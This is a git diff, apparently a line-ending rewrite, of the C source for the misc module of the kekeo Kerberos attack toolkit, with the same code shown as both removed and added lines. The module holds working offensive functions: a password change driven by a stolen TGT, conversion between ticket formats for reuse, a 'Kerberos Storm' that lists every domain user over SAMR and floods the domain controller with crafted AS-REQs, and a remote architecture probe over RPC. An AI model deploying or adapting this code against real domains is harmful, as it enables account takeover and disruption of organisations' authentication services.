-		ber_printf(pBer,"t{{"
-							"t{i}"
-								"t{i}"
-								"t{{"
-									"{t{i}t{o}}"
-								"}}"
-							"t{{"
-								"t{X}"
-								"t{{t{i}t{{to}}}}"
-								"t{ts}"
-								"t{{t{i}t{{tsts}}}}"
-								"t{ts}"
-								"t{i}"
-								"t{{i}}"
-							"}}"
-						"}}",
-						MAKE_APP_TAG(10),
-							MAKE_CTX_TAG(1), 5,
-							MAKE_CTX_TAG(2), 10,
-							MAKE_CTX_TAG(3),
-								MAKE_CTX_TAG(1), 2, MAKE_CTX_TAG(2), nullPATS, sizeof(nullPATS),
-							MAKE_CTX_TAG(4),
-								MAKE_CTX_TAG(0), reqFlags, sizeof(reqFlags),
-								MAKE_CTX_TAG(1), MAKE_CTX_TAG(0), KRB_NT_PRINCIPAL, MAKE_CTX_TAG(1), DIRTY_ASN1_ID_GENERAL_STRING, user->Buffer, user->Length,
-								MAKE_CTX_TAG(2), DIRTY_ASN1_ID_GENERAL_STRING, gDomain,
-								MAKE_CTX_TAG(3), MAKE_CTX_TAG(0), KRB_NT_SRV_INST, MAKE_CTX_TAG(1), DIRTY_ASN1_ID_GENERAL_STRING, "krbtgt", DIRTY_ASN1_ID_GENERAL_STRING, gDomain,
-								MAKE_CTX_TAG(5), DIRTY_ASN1_ID_GENERALIZED_TIME, "20370913024805Z",
-								MAKE_CTX_TAG(7), MIMIKATZ_NONCE,
-								MAKE_CTX_TAG(8), KERB_ETYPE_RC4_HMAC_NT
-					);
-		if(ber_flatten(pBer, &pBerVal) < 0)
-			PRINT_ERROR(L"ber_flatten for %Z@%S\n", user, gDomain);
-		ber_free(pBer, 1);
-	}
-	return pBerVal;
-}
-
-DWORD kuhl_m_misc_storm_giveUsersForServer(PCWSTR server)
-{
-	NTSTATUS status, enumDomainStatus, enumUserStatus;
-	UNICODE_STRING serverName;
-	SAMPR_HANDLE hServerHandle, hDomainHandle;
-	DWORD i, j, domainEnumerationContext = 0, domainCountRetourned, userEnumerationContext, userCountRetourned, totalUsers = 0;
-	PSAMPR_RID_ENUMERATION pEnumDomainBuffer, pEnumUsersBuffer;
-	PSID domainSid;
-
-	RtlInitUnicodeString(&serverName, server);
-	status = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
-	if(NT_SUCCESS(status))
-	{
-		do
-		{
-			enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
-			if(NT_SUCCESS(enumDomainStatus) || enumDomainStatus == STATUS_MORE_ENTRIES)
-			{
-				for(i = 0; i < domainCountRetourned; i++)
-				{
-					status = SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &domainSid);
-					if(NT_SUCCESS(status))
-					{
-						if(((PISID) domainSid)->SubAuthorityCount && (((PISID) domainSid)->SubAuthority[0] == SECURITY_BUILTIN_DOMAIN_RID))
-							continue;
-						kprintf(L"Domain name : %wZ\n", &pEnumDomainBuffer[i].Name);
-						kprintf(L"Domain SID  : "); kull_m_string_displaySID(domainSid); kprintf(L"\n");
-						status = SamOpenDomain(hServerHandle, DOMAIN_LIST_ACCOUNTS, domainSid, &hDomainHandle);
-						if(NT_SUCCESS(status))
-						{
-							userEnumerationContext = 0;
-							do
-							{
-								enumUserStatus = SamEnumerateUsersInDomain(hDomainHandle, &userEnumerationContext, USER_NORMAL_ACCOUNT, &pEnumUsersBuffer, 4*1024*1024, &userCountRetourned);
-								if(NT_SUCCESS(enumUserStatus) || enumUserStatus == STATUS_MORE_ENTRIES)
-								{
-									totalUsers += userCountRetourned;
-									for(j = 0; j < userCountRetourned; j++) 
-										kuhl_m_misc_storm_add(&pEnumUsersBuffer[j].Name);
-									SamFreeMemory(pEnumUsersBuffer);
-								}
-								else PRINT_ERROR(L"SamEnumerateUsersInDomain %08x", enumUserStatus);
-							}
-							while(enumUserStatus == STATUS_MORE_ENTRIES);
-							kprintf(L"Total       : %u\n", totalUsers);
-							SamCloseHandle(hDomainHandle);
-						}
-						else PRINT_ERROR(L"SamOpenDomain %08x", status);
-						SamFreeMemory(domainSid);
-					}
-					else PRINT_ERROR(L"SamLookupDomainInSamServer %08x", status);
-				}
-				SamFreeMemory(pEnumDomainBuffer);
-			}
-			else PRINT_ERROR(L"SamEnumerateDomainsInSamServer %08x\n", enumDomainStatus);
-		}
-		while(enumDomainStatus == STATUS_MORE_ENTRIES);
-		SamCloseHandle(hServerHandle);
-	}
-	return totalUsers;
-}
-
-NTSTATUS kuhl_m_misc_arch(int argc, wchar_t * argv[])
-{
-	KULL_M_SOCK sock;
-	PCWCHAR server = argc ? argv[0] : L"localhost";
-	DWORD cbOut;
-	prpcconn_bind_ack_hdr_t binda = NULL;
-	pp_result_list_t list = NULL;
-	static const rpcconn_bind_hdr_t bindr = {
-		5, 0,
-		RPC_PDU_bind,
-		0x02 | 0x01,
-		0x00000010,
-		sizeof(rpcconn_bind_hdr_t),
-		0,
-		2,
-		5840, 5840,
-		0,
-		{
-			1,
-			0, 0,
-			{
-				{
-					0,
-					1,
-					0,
-					{{0xe1af8308, 0x5d1f, 0x11c9, {0x91, 0xa4, 0x08, 0x00, 0x2b, 0x14, 0xa0, 0xfa}}, {3, 0}}, // AbstractSyntax EPMv4 v3.0
-					{
-						{{0x71710533, 0xbeba, 0x4937, {0x83, 0x19, 0xb5, 0xdb, 0xef, 0x9c, 0xcc, 0x36}}, {1, 0}} // TransferSyntax NDR64 v1.0
-					}
-				}
-			}
-		}
-	};
-
-	kprintf(L"Server      : %s\n", server);
-	if(kull_m_sock_init_addr_protocol(server, NULL, 135, IPPROTO_TCP, &sock))
-	{
-		if(kull_m_sock_connect(&sock))
-		{
-			if(kull_m_sock_SendAndRecv(&sock, &bindr, bindr.frag_length, (LPVOID *) &binda, &cbOut))
-			{
-				if(cbOut > FIELD_OFFSET(rpcconn_bind_ack_hdr_t, max_xmit_frag))
-				{
-					if(binda->PTYPE == RPC_PDU_bind_ack)
-					{
-						list = (pp_result_list_t) ((PBYTE) &binda->sec_addr + SIZE_ALIGN(FIELD_OFFSET(port_any_t, port_spec) + binda->sec_addr.length, 4));
-						if(list->n_results == 1)
-						{
-							if(list->p_results[0].result == RPC_CONT_DEF_RESULT_acceptance)
-								kprintf(L"Architecture: x64\n");
-							else if((list->p_results[0].result == RPC_CONT_DEF_RESULT_provider_rejection) && (list->p_results[0].reason == RPC_PROVIDER_REASON_proposed_transfer_syntaxes_not_supported))
-								kprintf(L"Architecture: x86\n");
-							else PRINT_ERROR(L"Result: %u -- Reason: %u\n", (DWORD) list->p_results[0].result, (DWORD) list->p_results[0].reason);
-						}
-						else PRINT_ERROR(L"n_results: %u\n", (DWORD) list->n_results);
-					}
-					else PRINT_ERROR(L"PTYPE: %u\n", (DWORD) binda->PTYPE);
-				}
-				else PRINT_ERROR(L"Size is not valid (%u)\n", cbOut);
-				LocalFree(binda);
-			}
-		}
-		kull_m_sock_termSocket(&sock);
-	}
-	return STATUS_SUCCESS;
+/*	Benjamin DELPY `gentilkiwi`
+	http://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+*/
+#include "kuhl_m_misc.h"
+
+const KUHL_M_C kuhl_m_c_misc[] = {
+	{kuhl_m_misc_changepw,	L"changepw",	L"Change user password (AoratoPw)"},
+	{kuhl_m_misc_convert,	L"convert",		L"Convert tickets"},
+	{kuhl_m_misc_storm,		L"storm",		L"Kerberos Storm!"},
+	{kuhl_m_misc_arch,		L"arch",		L"Ask RPC for NDR64 support"},
+};
+const KUHL_M kuhl_m_misc = {
+	L"misc",	L"Miscellaneous module", NULL,
+	ARRAYSIZE(kuhl_m_c_misc), kuhl_m_c_misc, NULL, NULL
+};
+
+NTSTATUS kuhl_m_misc_changepw(int argc, wchar_t * argv[])
+{
+	PCWSTR szData;
+	PWSTR domain;
+	PKULL_M_SOCK socket;
+
+	KRB_CRED *KrbCred = NULL;
+	EncKrbCredPart *encKrbCred = NULL;
+
+	AP_REP *ApRep = NULL;
+	KRB_PRIV *KrbPriv = NULL;
+	EncKrbPrivPart *encKrbPrivPart = NULL;
+	EncryptionKey authKey;
+	UInt32 seq;
+
+	OssBuf ApReq = {0, NULL}, KrbPrivReq = {0, NULL};
+	USHORT version;
+	_octet1 data;
+
+	if(kull_m_string_args_byName(argc, argv, L"tgt", &szData, NULL))
+	{
+		kprintf(L"Ticket  : %s\n", szData);
+		if(kull_m_kerberos_asn1_KrbCred_load(szData, NULL, &KrbCred, &encKrbCred))
+		{
+			if(domain = kull_m_string_qad_ansi_to_unicode(KrbCred->tickets->value.realm))
+			{
+				if(version = kull_m_kerberos_asn1_Authinfos_changepw(&data, argc, argv, KrbCred->tickets->value.realm))
+				{
+					if(kull_m_kerberos_asn1_ApReq_build(&ApReq, &encKrbCred->ticket_info->value.pname, encKrbCred->ticket_info->value.prealm, &KrbCred->tickets->value, &encKrbCred->ticket_info->value.key, KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, &authKey, &seq))
+					{
+						if(kull_m_kerberos_asn1_KrbPriv_build(&data, &authKey, "wtf", &KrbPrivReq, &seq))
+						{
+							if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(domain, KPASSWD_DEFAULT_PORT, argc, argv, TRUE))
+							{
+								if(kull_m_kerberos_asn1_net_callKadminOssBuf(socket, version, &ApReq, &KrbPrivReq, &ApRep, &KrbPriv))
+								{
+									if(kull_m_kerberos_asn1_EncKrbPrivPart_from_Priv_build(KrbPriv, &encKrbPrivPart, &authKey))
+									{
+										kprintf(L"[changepw] ");
+										kull_m_kadmin_passwd_retFromKadmin(&encKrbPrivPart->user_data);
+										ossFreePDU(&kull_m_kerberos_asn1_world, EncKrbPrivPart_PDU, encKrbPrivPart);
+									}
+									ossFreePDU(&kull_m_kerberos_asn1_world, KRB_PRIV_PDU, KrbPriv);
+									ossFreePDU(&kull_m_kerberos_asn1_world, AP_REP_PDU, ApRep);
+								}
+								kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
+							}
+							ossFreeBuf(&kull_m_kerberos_asn1_world, KrbPrivReq.value);
+						}
+						if(authKey.keyvalue.value)
+							LocalFree(authKey.keyvalue.value);
+						ossFreeBuf(&kull_m_kerberos_asn1_world, ApReq.value);
+					}
+					LocalFree(data.value);
+				}
+			}
+			ossFreePDU(&kull_m_kerberos_asn1_world, EncKrbCredPart_PDU, encKrbCred);
+			ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, KrbCred);
+		}
+	}
+	else PRINT_ERROR(L"A TGT is needed ( /tgt:filename.kirbi )\n");
+	return STATUS_SUCCESS;
+}
+
+const KULL_M_KADMIN_PASSWD_ERR kull_m_kadmin_passwd_err[] = {
+	{0,	L"KRB5_KPASSWD_SUCCESS"},
+	{1,	L"KRB5_KPASSWD_MALFORMED"},
+	{2,	L"KRB5_KPASSWD_HARDERROR"},
+	{3,	L"KRB5_KPASSWD_AUTHERROR"},
+	{4,	L"KRB5_KPASSWD_SOFTERROR"},
+	{5,	L"KRB5_KPASSWD_ACCESSDENIED"},
+	{6,	L"KRB5_KPASSWD_BAD_VERSION"},
+	{7,	L"KRB5_KPASSWD_INITIAL_FLAG_NEEDED"},
+};
+PCWSTR kull_m_kadmin_passwd_err_to_string(DWORD id)
+{
+	DWORD i;
+	for(i = 0; i < ARRAYSIZE(kull_m_kadmin_passwd_err); i++)
+		if(kull_m_kadmin_passwd_err[i].id == id)
+			return kull_m_kadmin_passwd_err[i].name;
+	return L"ERROR ?";
+}
+
+void kull_m_kadmin_passwd_retFromKadmin(_octet1 * data)
+{
+	WORD code;
+	if(data->length >= 2)
+	{
+		if(code = _byteswap_ushort(*(PWORD) data->value))
+			kprintf(L"%s (%u)", kull_m_kadmin_passwd_err_to_string(code), code);
+		else kprintf(L"OK");
+		if(data->length > 2)
+		{
+			kprintf(L" - {");
+			kull_m_string_wprintf_hex(data->value + 2, data->length - 2, 0);
+			kprintf(L"}");
+		}
+		kprintf(L"\n");
+	}
+	else PRINT_ERROR(L"Size\n");
+}
+
+const KERB_FORMAT_MODULE modules[] = {
+	{L"MIT Credential Cache", kiwi_ccache_valid_header, kiwi_ccache_read, kiwi_ccache_write, L"ccache", L"ccaches"},
+	{L"RFC KRB-CRED (#22)", kiwi_krbcred_valid_header, kiwi_krbcred_read, kiwi_krbcred_write, L"kirbi", L"kirbis"},
+	{L"WCE \'windows wce\'", kiwi_wce_valid_header, kiwi_wce_read, kiwi_wce_write, L"wce", L"wces"},
+	{L"Microsoft LSA API", NULL, NULL, kiwi_lsa_write, NULL, L"lsa"},
+};
+NTSTATUS kuhl_m_misc_convert(int argc, wchar_t * argv[])
+{
+	DWORD i, j;
+	KERB_FORMAT_MODULE const * readModule, * writeModule;
+	OssBuf input, output = {0, NULL};
+	KRB_CRED *cred = NULL, *dst = NULL;
+	BOOL explodeIt;
+
+	if(argc > 1)
+	{
+		writeModule = NULL;
+		for(j = 0; j < ARRAYSIZE(modules); j++)
+		{
+			if(modules[j].simpleName && !_wcsicmp(modules[j].simpleName, argv[0]))
+			{
+				writeModule = &modules[j];
+				explodeIt = FALSE;
+				break;
+			}
+			else if(modules[j].multiName && !_wcsicmp(modules[j].multiName, argv[0]))
+			{
+				writeModule = &modules[j];
+				explodeIt = TRUE;
+				break;
+			}
+		}
+
+		if(writeModule)
+		{
+			kprintf(L"Destination : %s (%s)\n", writeModule->shortName, explodeIt ? L"multiple" : L"simple");
+			for(i = 1; i < (DWORD) argc ; i++)
+			{
+				kprintf(L" < %s ", argv[i]);
+				if(kull_m_file_readData(argv[i], &input.value, (PDWORD) &input.length))
+				{
+					readModule = NULL;
+					for(j = 0; j < ARRAYSIZE(modules); j++)
+					{
+						if(modules[j].validHeader)
+						{
+							if(modules[j].validHeader(&input))
+							{
+								readModule = &modules[j];
+								break;
+							}
+						}
+					}
+
+					if(readModule)
+					{
+						kprintf(L"(%s) ", readModule->shortName);
+						if(readModule->readData && readModule->readData(&input, &cred))
+						{
+							addCred(cred, &dst);
+							ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, cred);
+						}
+						else kprintf(L": error when reading!");
+					}
+					else kprintf(L": format not recognized!");
+					kprintf(L"\n");
+					LocalFree(input.value);
+				}
+				else PRINT_ERROR_AUTO(L"kull_m_file_readData");
+			}
+
+			if(dst)
+			{
+				writeData(writeModule, explodeIt, dst);
+				ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, dst);
+			}
+		}
+	}
+	else PRINT_ERROR(L"Arguments missing! kirbi|ccache|wce|lsa|kirbis|ccaches|wces ticket1 [ticket2] [...]\n");
+	return STATUS_SUCCESS;
+}
+
+// globals for performances
+LIST_ENTRY gUserList = {&gUserList, &gUserList};
+PSTR gDomain;
+NTSTATUS kuhl_m_misc_storm(int argc, wchar_t * argv[])
+{
+	BOOL sockError = FALSE;
+	DWORD retry, i, total, dataOutSize;
+	IPPROTO mode = IPPROTO_TCP;
+	PBERVAL pBerVal = NULL;
+	KULL_M_SOCK fullsocket;
+	PVOID dataOut;
+	PKIWI_USERNAMEA entry, tmp;
+	FILETIME fTime;
+	LPCWSTR szDc, szDomain, szNum;
+
+	if(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL) && kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
+	{
+		gDomain = kull_m_string_unicode_to_ansi(szDomain);
+		
+		kull_m_string_args_byName(argc, argv, L"retry", &szNum, L"20");
+		retry = wcstoul(szNum, NULL, 0);
+		kprintf(L"DC name    : %s\nDomain FQDN: %s\nLogon retry: %u\nMode       : ", szDc, szDomain, retry);
+		if(kull_m_string_args_byName(argc, argv, L"udp", NULL, NULL))
+		{
+			mode = IPPROTO_UDP;
+			kprintf(L"UDP");
+		}
+		else kprintf(L"TCP");
+
+		GetSystemTimeAsFileTime(&fTime); kprintf(L"\n> Retrieving user list : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
+		if(total = kuhl_m_misc_storm_giveUsersForServer(szDc))
+		{
+			GetSystemTimeAsFileTime(&fTime); kprintf(L"> End of user list     : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
+			if(kull_m_sock_init_addr_protocol(szDc, NULL, KERBEROS_DEFAULT_PORT, mode, &fullsocket))
+			{
+				if(kull_m_sock_connect(&fullsocket))
+				{
+					GetSystemTimeAsFileTime(&fTime); kprintf(L"> Sending AS-REQ       : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
+					for(entry = (PKIWI_USERNAMEA) gUserList.Flink; !sockError && (entry != (PKIWI_USERNAMEA) &gUserList); entry = (PKIWI_USERNAMEA) entry->navigator.Flink)
+					{
+						if(pBerVal = kuhl_m_misc_storm_giveBERForUser(&entry->username))
+						{
+							for(i = 0; !sockError && (i < retry); i++)
+							{
+								if(kull_m_kerberos_asn1_net_SendAndRecv(&fullsocket, pBerVal->bv_val, pBerVal->bv_len, &dataOut, &dataOutSize))
+									LocalFree(dataOut);
+								else sockError = TRUE;
+							}
+							ber_bvfree(pBerVal);
+						}
+					}
+					GetSystemTimeAsFileTime(&fTime); kprintf(L"> End of AS-REQ        : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
+				}
+				kull_m_sock_termSocket(&fullsocket);
+			}
+
+			GetSystemTimeAsFileTime(&fTime); kprintf(L"> Free user list       : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
+			for(entry = (PKIWI_USERNAMEA) gUserList.Flink; entry != (PKIWI_USERNAMEA) &gUserList; entry = tmp)
+			{
+				tmp = (PKIWI_USERNAMEA) entry->navigator.Flink;
+				RtlFreeAnsiString(&entry->username);
+				LocalFree(entry);
+			}
+			gUserList.Blink = gUserList.Flink = &gUserList;
+			GetSystemTimeAsFileTime(&fTime); kprintf(L"> End of user list     : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
+		}
+		else PRINT_ERROR(L"unable to get users\n");
+
+		LocalFree(gDomain);
+	}
+	else PRINT_ERROR(L"/dc:<dc.fqdn.local> /domain:<fqdn.local> required\n");
+	return STATUS_SUCCESS;
+}
+
+BOOL kuhl_m_misc_storm_add(PCUNICODE_STRING name)
+{
+	BOOL status = FALSE;
+	PKIWI_USERNAMEA ua;
+	if(ua = (PKIWI_USERNAMEA) LocalAlloc(LPTR, sizeof(KIWI_USERNAMEA)))
+	{
+		ua->navigator.Blink = gUserList.Blink;
+		ua->navigator.Flink = &gUserList;
+		((PKIWI_USERNAMEA) gUserList.Blink)->navigator.Flink = (PLIST_ENTRY) ua;
+		gUserList.Blink= (PLIST_ENTRY) ua;
+		status = NT_SUCCESS(RtlUnicodeStringToAnsiString(&ua->username, name, TRUE));
+	}
+	return status;
+}
+
+const BYTE
+	reqFlags[] = {0x00, 0x40, 0x80, 0x00, 0x10},
+	nullPATS[] = {0x30, 0x36, 0xa0, 0x03, 0x02, 0x01, 0x17, 0xa2, 0x2f, 0x04, 0x2d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+PBERVAL kuhl_m_misc_storm_giveBERForUser(PCANSI_STRING user)
+{
+	BerElement *pBer;
+	PBERVAL pBerVal = NULL;
+	if(pBer = ber_alloc_t(LBER_USE_DER))
+	{
+		ber_printf(pBer,"t{{"
+							"t{i}"
+								"t{i}"
+								"t{{"
+									"{t{i}t{o}}"
+								"}}"
+							"t{{"
+								"t{X}"
+								"t{{t{i}t{{to}}}}"
+								"t{ts}"
+								"t{{t{i}t{{tsts}}}}"
+								"t{ts}"
+								"t{i}"
+								"t{{i}}"
+							"}}"
+						"}}",
+						MAKE_APP_TAG(10),
+							MAKE_CTX_TAG(1), 5,
+							MAKE_CTX_TAG(2), 10,
+							MAKE_CTX_TAG(3),
+								MAKE_CTX_TAG(1), 2, MAKE_CTX_TAG(2), nullPATS, sizeof(nullPATS),
+							MAKE_CTX_TAG(4),
+								MAKE_CTX_TAG(0), reqFlags, sizeof(reqFlags),
+								MAKE_CTX_TAG(1), MAKE_CTX_TAG(0), KRB_NT_PRINCIPAL, MAKE_CTX_TAG(1), DIRTY_ASN1_ID_GENERAL_STRING, user->Buffer, user->Length,
+								MAKE_CTX_TAG(2), DIRTY_ASN1_ID_GENERAL_STRING, gDomain,
+								MAKE_CTX_TAG(3), MAKE_CTX_TAG(0), KRB_NT_SRV_INST, MAKE_CTX_TAG(1), DIRTY_ASN1_ID_GENERAL_STRING, "krbtgt", DIRTY_ASN1_ID_GENERAL_STRING, gDomain,
+								MAKE_CTX_TAG(5), DIRTY_ASN1_ID_GENERALIZED_TIME, "20370913024805Z",
+								MAKE_CTX_TAG(7), MIMIKATZ_NONCE,
+								MAKE_CTX_TAG(8), KERB_ETYPE_RC4_HMAC_NT
+					);
+		if(ber_flatten(pBer, &pBerVal) < 0)
+			PRINT_ERROR(L"ber_flatten for %Z@%S\n", user, gDomain);
+		ber_free(pBer, 1);
+	}
+	return pBerVal;
+}
+
+DWORD kuhl_m_misc_storm_giveUsersForServer(PCWSTR server)
+{
+	NTSTATUS status, enumDomainStatus, enumUserStatus;
+	UNICODE_STRING serverName;
+	SAMPR_HANDLE hServerHandle, hDomainHandle;
+	DWORD i, j, domainEnumerationContext = 0, domainCountRetourned, userEnumerationContext, userCountRetourned, totalUsers = 0;
+	PSAMPR_RID_ENUMERATION pEnumDomainBuffer, pEnumUsersBuffer;
+	PSID domainSid;
+
+	RtlInitUnicodeString(&serverName, server);
+	status = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
+	if(NT_SUCCESS(status))
+	{
+		do
+		{
+			enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
+			if(NT_SUCCESS(enumDomainStatus) || enumDomainStatus == STATUS_MORE_ENTRIES)
+			{
+				for(i = 0; i < domainCountRetourned; i++)
+				{
+					status = SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &domainSid);
+					if(NT_SUCCESS(status))
+					{
+						if(((PISID) domainSid)->SubAuthorityCount && (((PISID) domainSid)->SubAuthority[0] == SECURITY_BUILTIN_DOMAIN_RID))
+							continue;
+						kprintf(L"Domain name : %wZ\n", &pEnumDomainBuffer[i].Name);
+						kprintf(L"Domain SID  : "); kull_m_string_displaySID(domainSid); kprintf(L"\n");
+						status = SamOpenDomain(hServerHandle, DOMAIN_LIST_ACCOUNTS, domainSid, &hDomainHandle);
+						if(NT_SUCCESS(status))
+						{
+							userEnumerationContext = 0;
+							do
+							{
+								enumUserStatus = SamEnumerateUsersInDomain(hDomainHandle, &userEnumerationContext, USER_NORMAL_ACCOUNT, &pEnumUsersBuffer, 4*1024*1024, &userCountRetourned);
+								if(NT_SUCCESS(enumUserStatus) || enumUserStatus == STATUS_MORE_ENTRIES)
+								{
+									totalUsers += userCountRetourned;
+									for(j = 0; j < userCountRetourned; j++) 
+										kuhl_m_misc_storm_add(&pEnumUsersBuffer[j].Name);
+									SamFreeMemory(pEnumUsersBuffer);
+								}
+								else PRINT_ERROR(L"SamEnumerateUsersInDomain %08x", enumUserStatus);
+							}
+							while(enumUserStatus == STATUS_MORE_ENTRIES);
+							kprintf(L"Total       : %u\n", totalUsers);
+							SamCloseHandle(hDomainHandle);
+						}
+						else PRINT_ERROR(L"SamOpenDomain %08x", status);
+						SamFreeMemory(domainSid);
+					}
+					else PRINT_ERROR(L"SamLookupDomainInSamServer %08x", status);
+				}
+				SamFreeMemory(pEnumDomainBuffer);
+			}
+			else PRINT_ERROR(L"SamEnumerateDomainsInSamServer %08x\n", enumDomainStatus);
+		}
+		while(enumDomainStatus == STATUS_MORE_ENTRIES);
+		SamCloseHandle(hServerHandle);
+	}
+	return totalUsers;
+}
+
+NTSTATUS kuhl_m_misc_arch(int argc, wchar_t * argv[])
+{
+	KULL_M_SOCK sock;
+	PCWCHAR server = argc ? argv[0] : L"localhost";
+	DWORD cbOut;
+	prpcconn_bind_ack_hdr_t binda = NULL;
+	pp_result_list_t list = NULL;
+	static const rpcconn_bind_hdr_t bindr = {
+		5, 0,
+		RPC_PDU_bind,
+		0x02 | 0x01,
+		0x00000010,
+		sizeof(rpcconn_bind_hdr_t),
+		0,
+		2,
+		5840, 5840,
+		0,
+		{
+			1,
+			0, 0,
+			{
+				{
+					0,
+					1,
+					0,
+					{{0xe1af8308, 0x5d1f, 0x11c9, {0x91, 0xa4, 0x08, 0x00, 0x2b, 0x14, 0xa0, 0xfa}}, {3, 0}}, // AbstractSyntax EPMv4 v3.0
+					{
+						{{0x71710533, 0xbeba, 0x4937, {0x83, 0x19, 0xb5, 0xdb, 0xef, 0x9c, 0xcc, 0x36}}, {1, 0}} // TransferSyntax NDR64 v1.0
+					}
+				}
+			}
+		}
+	};
+
+	kprintf(L"Server      : %s\n", server);
+	if(kull_m_sock_init_addr_protocol(server, NULL, 135, IPPROTO_TCP, &sock))
+	{
+		if(kull_m_sock_connect(&sock))
+		{
+			if(kull_m_sock_SendAndRecv(&sock, &bindr, bindr.frag_length, (LPVOID *) &binda, &cbOut))
+			{
+				if(cbOut > FIELD_OFFSET(rpcconn_bind_ack_hdr_t, max_xmit_frag))
+				{
+					if(binda->PTYPE == RPC_PDU_bind_ack)
+					{
+						list = (pp_result_list_t) ((PBYTE) &binda->sec_addr + SIZE_ALIGN(FIELD_OFFSET(port_any_t, port_spec) + binda->sec_addr.length, 4));
+						if(list->n_results == 1)
+						{
+							if(list->p_results[0].result == RPC_CONT_DEF_RESULT_acceptance)
+								kprintf(L"Architecture: x64\n");
+							else if((list->p_results[0].result == RPC_CONT_DEF_RESULT_provider_rejection) && (list->p_results[0].reason == RPC_PROVIDER_REASON_proposed_transfer_syntaxes_not_supported))
+								kprintf(L"Architecture: x86\n");
+							else PRINT_ERROR(L"Result: %u -- Reason: %u\n", (DWORD) list->p_results[0].result, (DWORD) list->p_results[0].reason);
+						}
+						else PRINT_ERROR(L"n_results: %u\n", (DWORD) list->n_results);
+					}
+					else PRINT_ERROR(L"PTYPE: %u\n", (DWORD) binda->PTYPE);
+				}
+				else PRINT_ERROR(L"Size is not valid (%u)\n", cbOut);
+				LocalFree(binda);
+			}
+		}
+		kull_m_sock_termSocket(&sock);
+	}
+	return STATUS_SUCCESS;
 }
\ No newline at end of file
diff --git a/kekeo/modules/kuhl_m_misc.h b/kekeo/modules/kuhl_m_misc.h
index 138b25a..6459441 100644
--- a/kekeo/modules/kuhl_m_misc.h
+++ b/kekeo/modules/kuhl_m_misc.h
@@ -1,55 +1,55 @@
-/*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
-	Licence : https://creativecommons.org/licenses/by/4.0/
-*/
-#pragma once
-#include "kuhl_m.h"
-#include "../../modules/asn1/kull_m_kerberos_asn1.h"
-#include "../../modules/asn1/kull_m_kerberos_asn1_authinfos.h"
-#include "../../modules/kull_m_string.h"
-#include "../../modules/kull_m_samlib.h"
-#include "codecs/common.h"
-#include <Winldap.h>
-#include <Winber.h>
-
-const KUHL_M kuhl_m_misc;
-
-NTSTATUS kuhl_m_misc_changepw(int argc, wchar_t * argv[]);
-NTSTATUS kuhl_m_misc_convert(int argc, wchar_t * argv[]);
-NTSTATUS kuhl_m_misc_storm(int argc, wchar_t * argv[]);
-NTSTATUS kuhl_m_misc_arch(int argc, wchar_t * argv[]);
-
-typedef struct _KULL_M_KADMIN_PASSWD_ERR{
-	DWORD	id;
-	PCWSTR	name;
-} KULL_M_KADMIN_PASSWD_ERR, *PKULL_M_KADMIN_PASSWD_ERR;
-
-PCWSTR kull_m_kadmin_passwd_err_to_string(DWORD id);
-void kull_m_kadmin_passwd_retFromKadmin(_octet1 * data);
-
-#define DIRTY_ASN1_ID_GENERAL_STRING	0x1b
-#define DIRTY_ASN1_ID_GENERALIZED_TIME	0x18
-#define DIRTY_ASN1_ID_SEQUENCE			0x30
-#define DIRTY_ASN1_MASK_APPLICATION		0x60
-#define DIRTY_ASN1_MASK_CONTEXT			0xa0
-
-#define MAKE_APP_TAG(AppId)		((ber_tag_t) (DIRTY_ASN1_MASK_APPLICATION | AppId))
-#define MAKE_CTX_TAG(CtxId)		((ber_tag_t) (DIRTY_ASN1_MASK_CONTEXT | CtxId))
-
-typedef struct _KIWI_USERNAMEA {
-	LIST_ENTRY navigator;
-	ANSI_STRING username;
-} KIWI_USERNAMEA, *PKIWI_USERNAMEA;
-
-BOOL kuhl_m_misc_storm_add(PCUNICODE_STRING name);
-PBERVAL kuhl_m_misc_storm_giveBERForUser(PCANSI_STRING user);
-DWORD kuhl_m_misc_storm_giveUsersForServer(PCWSTR server);
-
-//static const RPC_SYNTAX_IDENTIFIER AbstractSyntax =			{{0xe1af8308, 0x5d1f, 0x11c9, {0x91, 0xa4, 0x08, 0x00, 0x2b, 0x14, 0xa0, 0xfa}}, {3, 0}};
+/*	Benjamin DELPY `gentilkiwi`
+	http://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+*/
+#pragma once
